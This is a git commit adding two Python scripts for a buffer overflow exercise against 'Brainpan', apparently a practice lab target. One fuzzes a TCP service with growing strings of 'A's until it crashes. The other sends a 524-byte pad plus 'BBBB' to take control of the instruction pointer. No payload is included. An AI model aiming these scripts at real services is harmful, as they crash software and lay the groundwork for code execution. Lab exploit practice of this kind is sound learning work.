0df3dea2bc650538356514033da6e522c10bc240
danilofernassis <danilofernassis@gmail.com>
2021-05-15 18:12:21 -0300

    First Commint

---
+++ Buffer_Overflow/Brainpan/eip_offset.py
@@ -0,0 +1,27 @@
+import socket
+import sys
+
+# how to execute:
+# python overflow.py 192.168.1.109 9999
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+junk = ("A" * 524)
+
+eip = "BBBB"
+
+junk = junk + eip
+
+# sending junk
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing: " + str(len(junk)))
+        s.send(junk + "\n")
+        s.recv(1024)
+        s.close()
+    except:
+        sys.exit(0)
---
+++ Buffer_Overflow/Brainpan/fuzzing.py
@@ -0,0 +1,25 @@
+import socket
+import sys
+
+# how to execute:
+# python overflow.py 192.168.1.109 9999
+# script stop with 600
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+junk = ("A" * 100)
+
+# sending junk
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing: " + str(len(junk)))
+        s.send(junk + "\n")
+        s.recv(1024)
+        s.close()
+        junk += ("A" * 100)
+    except:
+        sys.exit(0)
